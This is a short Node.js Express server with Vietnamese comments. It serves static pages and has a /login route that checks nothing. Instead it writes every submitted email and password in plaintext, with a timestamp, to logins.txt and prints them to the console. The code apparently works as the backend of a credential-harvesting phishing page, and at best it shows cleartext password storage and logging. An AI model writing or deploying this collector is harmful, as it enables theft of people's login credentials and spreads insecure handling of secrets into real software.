
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 8080;

// Middleware để xử lý JSON
app.use(express.json());

// Phục vụ file tĩnh từ thư mục public
app.use(express.static(path.join(__dirname, 'public')));

// Route POST để nhận dữ liệu đăng nhập
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Kiểm tra dữ liệu đầu vào
    if (!email || !password) {
        return res.status(400).send('Email và mật khẩu là bắt buộc');
    }

    // Chuẩn bị dữ liệu để lưu
    const data = `Email: ${email}, Password: ${password}, Time: ${new Date().toISOString()}\n`;

    // Lưu vào file logins.txt
    fs.appendFile('logins.txt', data, (err) => {
        if (err) {
            console.error('Lỗi khi lưu dữ liệu:', err);
            return res.status(500).send('Lỗi máy chủ');
        }
        console.log('Đã lưu:', data);
        res.status(200).send('Thông tin đã được nhận');
    });
});

// Khởi động máy chủ trên tất cả giao diện
app.listen(port, '0.0.0.0', () => {
    console.log(`Server running at http://localhost:${port}`);
});

